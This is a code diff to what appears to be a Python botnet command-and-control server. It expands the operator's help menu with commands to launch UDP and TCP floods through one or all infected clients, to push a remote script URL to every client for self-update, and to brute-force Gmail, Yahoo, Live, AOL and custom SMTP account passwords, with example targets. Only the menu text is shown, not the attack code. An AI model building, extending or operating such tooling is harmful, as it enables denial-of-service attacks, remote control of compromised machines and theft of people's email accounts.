@@ -15,20 +15,39 @@ Blog: http://dotcppfile.worpdress.com"
 """
 
 commands = """---------
-Commands:
----------
+Primary:
+--------
 accept                  | Accept connections
 list                    | List connections
-interact <id>           | Interact with client
-udpflood <ip>:<port>    | UDP flood threw client
-udpfloodall <ip>:<port> | UDP flood threw All clients
-tcpflood <ip>:<port>    | TCP flood threw client
-tcpfloodall <ip>:<port> | TCP flood threw All clients
-stop                    | Stop interacting with client
 clear                   | Clear the console
 quit                    | Close all connections and quit
 credits                 | Show Credits
 help                    | Show this message
+
+Client Interaction:
+-------------------
+interact <id>           | Interact with client
+stop                    | Stop interacting with client
+udpflood <ip>:<port>    | UDP flood threw client
+tcpflood <ip>:<port>    | TCP flood threw client
+
+Wide Commands:
+--------------
+udpfloodall <ip>:<port> | UDP flood threw All clients
+tcpfloodall <ip>:<port> | TCP flood threw All clients
+selfupdateall <link>    | Update all Clients
+	Example: selfupdateall http://whatever.com/newscript.py
+
+Bruteforce:
+-----------
+gmailbruteforce <email>:<keys>:<min>:<max>
+yahoobruteforce <email>:<keys>:<min>:<max>
+livebruteforce <email>:<keys>:<min>:<max>
+aolbruteforce <email>:<keys>:<min>:<max>
+	Example: gmailbruteforce someone@gmail.com:0123456789:6:8
+custombruteforce <address>:<port>:<email>:<keys>:<min>:<max>
+	Example: custombruteforce smtp.whatever.com:587:something@whatever.com:abcdefghi:4:6
+
 \n"""
 
 if (len(sys.argv) == 4):
